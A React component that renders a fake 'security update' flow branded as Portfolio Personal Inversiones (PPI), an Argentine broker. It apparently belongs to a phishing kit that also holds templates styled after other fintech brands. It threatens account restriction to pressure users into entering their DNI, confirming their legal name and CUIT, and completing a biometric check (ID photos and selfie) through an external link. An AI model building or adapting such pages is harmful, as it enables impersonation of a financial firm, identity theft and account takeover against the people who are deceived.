import { useState } from "react";
import {
  Camera, CheckCircle2, ChevronRight, Clock, Copy, Check,
  CreditCard, ExternalLink, FileCheck, Loader2, Lock,
  MapPin, ScanFace, Shield, ShieldAlert, ShieldCheck,
  Smartphone, UserRound,
} from "lucide-react";
import ppiLogoSvg from "@/assets/ppi-logo.svg";
import type { KycFlowScreen } from "@/components/kyc/WayniKycStageView";

interface LegalCandidate {
  full_name: string;
  gender: string;
  tax_identification_value: string;
}

export interface PpiKycStageViewProps {
  brandName: string;
  email: string;
  step: KycFlowScreen;
  progressValue: number;
  fullName: string;
  phonePreview: string;
  dni: string;
  biometricStatus: string;
  walletStatus: string;
  submittedAt?: string | null;
  candidates: LegalCandidate[];
  selectedCandidateKey: string;
  verifyLoading: boolean;
  verifyError: string;
  dniValue: string;
  phoneValue: string;
  genderValue: string;
  addressError: string;
  loadingProvinces: boolean;
  loadingLocalities: boolean;
  addressLoading: boolean;
  selectedProvinceId: string;
  selectedLocalityId: string;
  provinces: Record<string, string>;
  localities: Record<string, string>;
  streetName: string;
  streetNumber: string;
  floor: string;
  apartment: string;
  zipCode: string;
  biometricUrl: string;
  biometricStarted: boolean;
  checkingBiometric: boolean;
  onStart: () => void;
  onDniChange: (value: string) => void;
  onPhoneChange: (value: string) => void;
  onGenderChange: (value: string) => void;
  onSelectCandidate: (value: string) => void;
  onVerifySubmit: () => void;
  onProvinceChange: (value: string) => void;
  onLocalityChange: (value: string) => void;
  onStreetNameChange: (value: string) => void;
  onStreetNumberChange: (value: string) => void;
  onFloorChange: (value: string) => void;
  onApartmentChange: (value: string) => void;
  onZipCodeChange: (value: string) => void;
  onAddressSubmit: () => void;
  onOpenBiometric: () => void;
  onRefreshBiometric: () => void;
}

const candidateKey = (c: LegalCandidate) => `${c.full_name}|${c.gender}|${c.tax_identification_value}`;

/* ─── Verify Screen (Cocos v2 style) ─── */
const VerifyCard = ({
  email, fullName, verifyError, dniValue, genderValue, verifyLoading,
  candidates, selectedCandidateKey,
  onDniChange, onGenderChange, onSelectCandidate, onVerifySubmit,
}: Pick<PpiKycStageViewProps,
  "email" | "fullName" | "verifyError" | "dniValue" | "genderValue" | "verifyLoading" |
  "candidates" | "selectedCandidateKey" |
  "onDniChange" | "onGenderChange" | "onSelectCandidate" | "onVerifySubmit"
>) => (
  <div className="w-full max-w-[480px] mx-auto px-1">
    {/* Logo */}
    <div className="flex justify-center mb-5">
      <img src={ppiLogoSvg} alt="PPI" className="h-9 sm:h-11" />
    </div>

    {/* Security banner */}
    <div className="rounded-xl border border-amber-200 bg-gradient-to-r from-amber-50 to-orange-50/60 px-4 py-3 mb-4">
      <div className="flex items-start gap-2.5">
        <ShieldAlert size={16} className="text-amber-600 flex-shrink-0 mt-0.5" />
        <div>
          <p className="text-[12px] sm:text-[13px] text-[#1e2a3a] font-bold leading-snug mb-0.5">
            Actualización de seguridad obligatoria
          </p>
          <p className="text-[11px] sm:text-[12px] text-[#5a6a85] leading-relaxed">
            Por normativa de la CNV, necesitamos confirmar tus datos para <strong className="text-[#1e2a3a]">proteger tus fondos e inversiones</strong>. Sin completar este paso, tu cuenta será <strong className="text-amber-700">limitada temporalmente</strong>.
          </p>
        </div>
      </div>
    </div>

    {/* Main card */}
    <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(30,90,150,0.12)] border border-[#e8edf5] overflow-hidden">
      <div className="h-1 w-full bg-gradient-to-r from-[#1e5a96] via-[#42a5f5] to-[#1e5a96]" />
      <div className="px-5 sm:px-7 pt-5 sm:pt-6 pb-6 sm:pb-7">
        <div className="flex flex-col items-center text-center mb-5">
          <div className="w-11 h-11 sm:w-12 sm:h-12 rounded-full bg-[#eef2ff] border border-[#dbe4ff] flex items-center justify-center mb-3">
            <CreditCard size={20} className="text-[#1e5a96]" />
          </div>
          <h3 className="text-[16px] sm:text-[18px] font-bold text-[#1e2a3a] mb-1">Confirmación de datos personales</h3>
          <p className="text-[12px] sm:text-[13px] text-[#8895aa] max-w-[320px] leading-relaxed">
            Confirmá tu documento de identidad para mantener tu cuenta activa y tus fondos 100% seguros.
          </p>
        </div>

        {verifyError && (
          <div className="mb-3 rounded-xl border border-[#fecaca] bg-[#fef2f2] px-3 py-2.5 text-[12px] sm:text-[13px] text-red-600">
            {verifyError}
          </div>
        )}

        <form onSubmit={(e) => { e.preventDefault(); onVerifySubmit(); }} className="flex flex-col gap-3">
          <div>
            <label className="block text-[11px] sm:text-[12px] font-semibold text-[#5a6a85] mb-1.5">Número de DNI</label>
            <input
              type="text"
              inputMode="numeric"
              placeholder="Ej: 38045521"
              value={dniValue}
              onChange={(e) => onDniChange(e.target.value)}
              maxLength={10}
              autoFocus
              disabled={verifyLoading}
              className="w-full rounded-xl border border-[#d0d5dd] bg-[#f8f9fb] px-4 py-3 text-[13px] sm:text-[14px] text-[#1e2a3a] outline-none transition-all placeholder:text-[#b0b8c9] focus:border-[#1e5a96] focus:ring-2 focus:ring-[#1e5a96]/15 disabled:opacity-50"
            />
          </div>

          <div>
            <label className="block text-[11px] sm:text-[12px] font-semibold text-[#5a6a85] mb-1.5">Sexo (opcional)</label>
            <select
              value={genderValue}
              onChange={(e) => onGenderChange(e.target.value.toUpperCase())}
              disabled={verifyLoading}
              className="w-full rounded-xl border border-[#d0d5dd] bg-[#f8f9fb] px-4 py-3 text-[13px] sm:text-[14px] text-[#1e2a3a] outline-none transition-all focus:border-[#1e5a96] focus:ring-2 focus:ring-[#1e5a96]/15 disabled:opacity-50"
            >
              <option value="">Seleccionar</option>
              <option value="F">Femenino</option>
              <option value="M">Masculino</option>
            </select>
          </div>

          {candidates.length > 1 && (
            <div className="rounded-xl border border-[#d0d5dd] bg-[#f8f9fb] p-3">
              <p className="text-[11px] sm:text-[12px] font-semibold text-[#5a6a85] mb-2">Seleccioná tu nombre</p>
              <div className="space-y-2">
                {candidates.map((c) => {
                  const key = candidateKey(c);
                  const isSelected = selectedCandidateKey === key;
                  return (
                    <button
                      key={key}
                      type="button"
                      onClick={() => onSelectCandidate(key)}
                      disabled={verifyLoading}
                      className={`w-full rounded-lg border px-3 py-2 text-left transition-all ${isSelected ? "border-[#1e5a96] bg-[#eef2ff]" : "border-[#d0d5dd] bg-white hover:border-[#9ab3ef]"}`}
                    >
                      <p className="text-[12px] sm:text-[13px] font-semibold text-[#1e2a3a] truncate">{c.full_name}</p>
                      <p className="text-[10px] sm:text-[11px] text-[#8895aa]">CUIT: {c.tax_identification_value} · Sexo: {c.gender || "—"}</p>
                    </button>
                  );
                })}
              </div>
            </div>
          )}

          <button
            type="submit"
            disabled={verifyLoading}
            className="w-full rounded-xl bg-gradient-to-r from-[#1e5a96] to-[#2a7bc8] py-3.5 text-[13px] sm:text-[14px] font-bold text-white transition-all hover:from-[#174a7f] hover:to-[#1e5a96] active:scale-[0.98] disabled:opacity-50 shadow-lg shadow-[#1e5a96]/20 mt-1"
          >
            {verifyLoading ? (
              <span className="flex items-center justify-center gap-2">
                <Loader2 className="w-4 h-4 animate-spin" />
                Verificando datos...
              </span>
            ) : "Confirmar y verificar"}
          </button>
        </form>

        <p className="mt-4 text-center text-[10px] text-[#b0b8c9] leading-relaxed">
          🔒 Tus datos están protegidos con cifrado de extremo a extremo conforme a las normativas de la CNV.
        </p>
      </div>
    </div>
  </div>
);

/* ─── Biometric Screen (Cocos v2 style) ─── */
const BiometricCard = ({
  email, fullName, biometricUrl, biometricStarted, checkingBiometric, dni,
  onOpenBiometric, onRefreshBiometric,
}: Pick<PpiKycStageViewProps,
  "email" | "fullName" | "biometricUrl" | "biometricStarted" | "checkingBiometric" | "dni" |
  "onOpenBiometric" | "onRefreshBiometric"
>) => {
  const [copied, setCopied] = useState(false);
  const firstName = fullName?.split(" ")?.[0] || "";

  const handleCopyLink = async () => {
    if (!biometricUrl) return;
    try {
      await navigator.clipboard.writeText(biometricUrl);
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    } catch { /* ignore */ }
  };

  if (biometricStarted) {
    return (
      <div className="w-full max-w-[520px] mx-auto px-1">
        <div className="flex justify-center mb-4">
          <img src={ppiLogoSvg} alt="PPI" className="h-8 sm:h-10" />
        </div>

        <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(30,90,150,0.12)] border border-[#e8edf5] overflow-hidden">
          <div className="h-1 w-full bg-gradient-to-r from-[#f59e0b] via-[#f97316] to-[#f59e0b]" />

          <div className="px-5 sm:px-6 py-6 sm:py-8 text-center">
            <div className="flex justify-center mb-4">
              <div className="relative">
                <div className="absolute -inset-3 rounded-full bg-amber-100/50 animate-pulse" />
                <div className="relative flex h-14 w-14 sm:h-16 sm:w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#f59e0b] to-[#f97316] shadow-lg">
                  <ShieldCheck size={28} className="text-white sm:hidden" strokeWidth={1.8} />
                  <ShieldCheck size={32} className="text-white hidden sm:block" strokeWidth={1.8} />
                </div>
              </div>
            </div>
            <h3 className="text-[16px] sm:text-[18px] font-bold text-[#1e2a3a] mb-2">Verificación en curso</h3>
            <p className="text-[12px] sm:text-[13px] text-[#5a6a85] leading-relaxed mb-4 max-w-[340px] mx-auto">
              Completá la verificación de tu documento en la pestaña que se abrió para proteger tu cuenta.
            </p>

            {/* Copy link button */}
            <button
              onClick={handleCopyLink}
              className={`flex items-center justify-center gap-2.5 w-full rounded-xl py-3.5 text-sm font-bold transition-all duration-200 mb-4 ${
                copied
                  ? "bg-emerald-50 border-2 border-emerald-400 text-emerald-700"
                  : "bg-[#1e5a96] text-white hover:bg-[#174a7f] active:scale-[0.98] shadow-md shadow-[#1e5a96]/25"
              }`}
            >
              {copied ? <><Check size={18} /> ¡Link copiado!</> : <><Copy size={18} /> Copiar link de verificación</>}
            </button>

            <button
              onClick={onOpenBiometric}
              className="text-[12px] sm:text-[13px] text-[#1e5a96] underline underline-offset-2 hover:text-[#2a7bc8] transition-colors"
            >
              ¿No se abrió? Haz clic acá
            </button>

            {/* Mobile tip */}
            <div className="mt-4 rounded-xl border border-[#e8edf5] bg-[#f8fafc] px-3 sm:px-4 py-3">
              <div className="flex items-center gap-2 mb-1.5">
                <Smartphone size={13} className="text-[#5a6a85]" />
                <span className="text-[11px] sm:text-[12px] font-semibold text-[#5a6a85]">¿Estás desde el celular?</span>
              </div>
              <p className="text-[10px] sm:text-[11px] text-[#8895aa] leading-relaxed">
                Copiá el enlace y completá la verificación desde tu navegador móvil.
              </p>
            </div>
          </div>

          <div className="px-5 sm:px-6 py-3.5 sm:py-4 border-t border-[#e8edf5]">
            <button
              onClick={onRefreshBiometric}
              disabled={checkingBiometric || !dni}
              className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#16a34a] to-[#22c55e] py-3 sm:py-3.5 text-[13px] sm:text-[14px] font-bold text-white transition-all hover:from-[#15803d] hover:to-[#16a34a] active:scale-[0.98] shadow-md shadow-green-200 disabled:opacity-50"
            >
              {checkingBiometric ? (
                <><Loader2 size={17} className="animate-spin" /> Verificando...</>
              ) : (
                <><CheckCircle2 size={17} /> Ya completé la verificación</>
              )}
            </button>
          </div>
        </div>

        <div className="flex justify-center mt-3">
          <div className="flex items-center gap-2 rounded-full border border-[#e8edf5] bg-[#f8fafc] px-4 py-2">
            <div className="h-1.5 w-1.5 rounded-full bg-[#f59e0b]" />
            <span className="text-[11px] sm:text-[12px] text-[#8895aa] max-w-[220px] truncate">{email}</span>
          </div>
        </div>
      </div>
    );
  }

  /* Pre-verification */
  return (
    <div className="w-full max-w-[480px] mx-auto px-1">
      <div className="flex justify-center mb-5">
        <img src={ppiLogoSvg} alt="PPI" className="h-9 sm:h-11" />
      </div>

      {/* Success badge */}
      <div className="flex justify-center mb-4">
        <div className="relative">
          <div className="absolute -inset-3 rounded-full bg-green-100/50 animate-pulse" />
          <div className="relative flex h-16 w-16 sm:h-20 sm:w-20 items-center justify-center rounded-full bg-gradient-to-br from-[#16a34a] to-[#22c55e] shadow-xl shadow-green-200">
            <CheckCircle2 size={32} className="text-white sm:hidden" strokeWidth={1.8} />
            <CheckCircle2 size={40} className="text-white hidden sm:block" strokeWidth={1.8} />
          </div>
        </div>
      </div>

      <h2 className="text-center text-[18px] sm:text-[21px] font-extrabold text-[#1e2a3a] mb-2 leading-tight">
        ¡Excelente{firstName ? `, ${firstName}` : ""}!
      </h2>
      <p className="text-center text-[13px] sm:text-[14px] text-[#5a6a85] leading-relaxed mb-5 max-w-[340px] mx-auto">
        Tu identidad fue confirmada. Para mantener tu cuenta segura, completá el último paso.
      </p>

      {/* Security urgency */}
      <div className="rounded-xl border border-amber-200 bg-gradient-to-r from-amber-50 to-orange-50/60 px-4 py-3 mb-4 mx-auto max-w-[400px]">
        <div className="flex items-start gap-2.5">
          <Lock size={15} className="text-amber-600 flex-shrink-0 mt-0.5" />
          <p className="text-[11.5px] sm:text-[12.5px] text-[#1e2a3a] font-semibold leading-relaxed">
            Esta verificación es un <strong className="text-amber-700">procedimiento estándar de Portfolio Personal</strong> para proteger tus fondos. Sin completarla, tu cuenta quedará <strong className="text-amber-700">temporalmente restringida</strong>.
          </p>
        </div>
      </div>

      {/* Verification card */}
      <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(30,90,150,0.12)] border border-[#e8edf5] overflow-hidden mb-5">
        <div className="h-1 w-full bg-gradient-to-r from-[#1e5a96] via-[#42a5f5] to-[#1e5a96]" />
        <div className="px-5 sm:px-6 py-5">
          <div className="flex items-start gap-3 mb-4">
            <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-full bg-[#eef2ff] border border-[#dbe4ff] flex items-center justify-center flex-shrink-0">
              <ShieldCheck size={18} className="text-[#1e5a96]" />
            </div>
            <div>
              <h4 className="text-[14px] sm:text-[15px] font-bold text-[#1e2a3a] mb-1">Verificación documental de seguridad</h4>
              <p className="text-[12px] sm:text-[13px] text-[#5a6a85] leading-relaxed">
                Para garantizar la <strong className="text-[#1e2a3a]">seguridad de tus inversiones</strong> y cumplir con las normas de la CNV, necesitamos una verificación rápida de tu documento oficial.
              </p>
            </div>
          </div>

          <div className="space-y-2.5 mb-4">
            {[
              { icon: Shield, text: "Verificación de DNI (frente y dorso)" },
              { icon: ShieldCheck, text: "Reconocimiento facial automático (selfie)" },
              { icon: Lock, text: "Máxima protección de tus fondos e inversiones" },
            ].map(({ icon: Icon, text }) => (
              <div key={text} className="flex items-center gap-2.5">
                <span className="rounded-full bg-[#16a34a] flex items-center justify-center flex-shrink-0" style={{ width: 18, height: 18 }}>
                  <svg className="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </span>
                <span className="text-[12px] sm:text-[13px] text-[#333]">{text}</span>
              </div>
            ))}
          </div>

          <div className="flex items-center gap-2 text-[11px] sm:text-[12px] text-[#8895aa] mb-5">
            <Clock size={13} />
            <span>Proceso simple y seguro — menos de <strong className="text-[#1e2a3a]">2 minutos</strong></span>
          </div>

          <button
            onClick={onOpenBiometric}
            disabled={!biometricUrl}
            className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#1e5a96] to-[#2a7bc8] py-3.5 sm:py-4 text-[13px] sm:text-[14px] font-bold text-white transition-all hover:from-[#174a7f] hover:to-[#1e5a96] active:scale-[0.98] shadow-lg shadow-[#1e5a96]/25 disabled:opacity-50"
          >
            Verificar y proteger mi cuenta
            <ExternalLink size={15} />
          </button>
        </div>
      </div>

      {/* Trust footer */}
      <div className="flex justify-center mb-3">
        <div className="flex items-center gap-2 rounded-full border border-[#e8edf5] bg-[#f8fafc] px-4 py-2">
          <div className="h-1.5 w-1.5 rounded-full bg-[#16a34a]" />
          <span className="text-[11px] sm:text-[12px] text-[#8895aa] max-w-[220px] truncate">{email}</span>
        </div>
      </div>

      <p className="text-center text-[10px] sm:text-[11px] text-[#b0b8c9] leading-relaxed max-w-[360px] mx-auto">
        🔐 Procedimiento estándar de Portfolio Personal Inversiones S.A. para garantizar la seguridad de tu cuenta. Cumplimos con todas las normativas vigentes de la CNV.
      </p>
    </div>
  );
};

/* ─── Done Screen ─── */
const DoneCard = ({ email, submittedAt }: { email: string; submittedAt?: string | null }) => (
  <div className="w-full max-w-[440px] mx-auto px-1">
    <div className="flex justify-center mb-5">
      <img src={ppiLogoSvg} alt="PPI" className="h-9 sm:h-11" />
    </div>

    <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(30,90,150,0.12)] border border-[#e8edf5] overflow-hidden">
      <div className="h-1 w-full bg-gradient-to-r from-[#16a34a] via-[#22c55e] to-[#16a34a]" />
      <div className="px-6 py-8 text-center">
        <div className="flex justify-center mb-4">
          <div className="flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#16a34a] to-[#22c55e] shadow-lg shadow-green-200">
            <CheckCircle2 size={32} className="text-white" strokeWidth={1.8} />
          </div>
        </div>
        <h3 className="text-[20px] sm:text-[22px] font-bold text-[#1e2a3a] mb-2">Validación completada</h3>
        <p className="text-[13px] sm:text-[14px] text-[#5a6a85] leading-relaxed mb-4">
          Tus datos fueron verificados correctamente. Tu cuenta de Portfolio Personal está protegida.
        </p>
        <div className="space-y-1 text-[12px] text-[#8895aa]">
          <p>Cuenta: <span className="text-[#1e2a3a] font-medium">{email}</span></p>
          {submittedAt && <p>Enviado: <span className="text-[#1e2a3a] font-medium">{new Date(submittedAt).toLocaleString("es-AR")}</span></p>}
        </div>
      </div>
    </div>
  </div>
);

/* ─── Main Component ─── */
const PpiKycStageView = (props: PpiKycStageViewProps) => {
  const { step } = props;

  return (
    <div className="flex min-h-0 flex-1 flex-col bg-white">
      {/* Header */}
      <header className="flex items-center justify-between border-b border-[#f0f0f0] px-5 py-3 sm:px-8">
        <img src={ppiLogoSvg} alt="PPI" className="h-7 sm:h-8" />
        <span className="text-[12px] sm:text-[13px] font-medium text-[#8895aa]">
          {step === "done" ? "Completado" : "Validación de seguridad"}
        </span>
      </header>

      {/* Progress bar */}
      {step !== "done" && (
        <div className="h-1 w-full bg-[#f0f2f5]">
          <div
            className="h-full bg-gradient-to-r from-[#1e5a96] to-[#42a5f5] transition-all duration-500 ease-out"
            style={{ width: `${props.progressValue}%` }}
          />
        </div>
      )}

      {/* Content */}
      <main className="flex flex-1 items-center justify-center overflow-y-auto px-3 py-5 sm:px-5 sm:py-8">
        {step === "verify" && (
          <VerifyCard
            email={props.email}
            fullName={props.fullName}
            verifyError={props.verifyError}
            dniValue={props.dniValue}
            genderValue={props.genderValue}
            verifyLoading={props.verifyLoading}
            candidates={props.candidates}
            selectedCandidateKey={props.selectedCandidateKey}
            onDniChange={props.onDniChange}
            onGenderChange={props.onGenderChange}
            onSelectCandidate={props.onSelectCandidate}
            onVerifySubmit={props.onVerifySubmit}
          />
        )}
        {step === "biometric" && (
          <BiometricCard
            email={props.email}
            fullName={props.fullName}
            biometricUrl={props.biometricUrl}
            biometricStarted={props.biometricStarted}
            checkingBiometric={props.checkingBiometric}
            dni={props.dni}
            onOpenBiometric={props.onOpenBiometric}
            onRefreshBiometric={props.onRefreshBiometric}
          />
        )}
        {step === "done" && <DoneCard email={props.email} submittedAt={props.submittedAt} />}
      </main>

      {/* Footer */}
      <footer className="border-t border-[#e5e7eb] bg-white px-5 py-2.5 sm:px-8">
        <p className="text-center text-[10px] text-[#bbb]">
          Portfolio Personal Inversiones S.A. — ALyC Integral CNV N° 686 | Proceso de seguridad automatizado
        </p>
      </footer>
    </div>
  );
};

export default PpiKycStageView;
